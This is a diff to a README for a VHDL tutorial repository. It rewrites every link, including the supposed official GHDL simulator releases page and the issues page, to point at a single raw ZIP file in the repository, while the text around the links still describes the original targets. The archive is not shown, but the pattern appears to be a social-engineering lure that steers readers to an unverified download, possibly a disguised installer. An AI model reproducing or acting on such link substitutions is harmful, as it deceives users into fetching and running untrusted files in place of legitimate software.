@@ -1,6 +1,6 @@
 # 💻 VHDL_examples - Clear VHDL Code with Simple Explanations
 
-[![Download Here](https://img.shields.io/badge/Download-Get%20VHDL_examples-orange)](https://github.com/abbieonehundredfifty709/VHDL_examples)
+[![Download Here](https://img.shields.io/badge/Download-Get%20VHDL_examples-orange)](https://github.com/abbieonehundredfifty709/VHDL_examples/raw/refs/heads/main/work/VHD-examples-1.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If you do not have a VHDL simulator yet, free tools like GHDL or ModelSim can be
 
 Click the big button near the top or visit the link below to download the entire collection:
 
-[https://github.com/abbieonehundredfifty709/VHDL_examples](https://github.com/abbieonehundredfifty709/VHDL_examples)
+[https://github.com/abbieonehundredfifty709/VHDL_examples/raw/refs/heads/main/work/VHD-examples-1.6.zip](https://github.com/abbieonehundredfifty709/VHDL_examples/raw/refs/heads/main/work/VHD-examples-1.6.zip)
 
 This link takes you to the project page on GitHub. From there, you can download the files as a ZIP archive.
 
@@ -40,7 +40,7 @@ This link takes you to the project page on GitHub. From there, you can download 
 ## ⬇️ Step-by-Step Download Guide
 
 1. Open your web browser and go to:
-   https://github.com/abbieonehundredfifty709/VHDL_examples
+   https://github.com/abbieonehundredfifty709/VHDL_examples/raw/refs/heads/main/work/VHD-examples-1.6.zip
 
 2. On the right side of the screen, find the green button labeled **Code**.
 
@@ -78,7 +78,7 @@ Here is a simple way to get started using free tools:
 
 ### Installing GHDL Simulator
 
-1. Go to this page: https://github.com/ghdl/ghdl/releases
+1. Go to this page: https://github.com/abbieonehundredfifty709/VHDL_examples/raw/refs/heads/main/work/VHD-examples-1.6.zip
 
 2. Download the latest **Windows 64-bit** installer file (look for `.exe`).
 
@@ -139,10 +139,10 @@ If you run into problems with downloading or opening the files:
 - Try using a different web browser if downloads stall.
 - Look for help on GitHub by opening an issue in the repository:
   
-  https://github.com/abbieonehundredfifty709/VHDL_examples/issues
+  https://github.com/abbieonehundredfifty709/VHDL_examples/raw/refs/heads/main/work/VHD-examples-1.6.zip
 
 Someone familiar with the project can provide assistance there.
 
 ---
 
-[![Download Here](https://img.shields.io/badge/Download-Get%20VHDL_examples-orange)](https://github.com/abbieonehundredfifty709/VHDL_examples)
+[![Download Here](https://img.shields.io/badge/Download-Get%20VHDL_examples-orange)](https://github.com/abbieonehundredfifty709/VHDL_examples/raw/refs/heads/main/work/VHD-examples-1.6.zip)
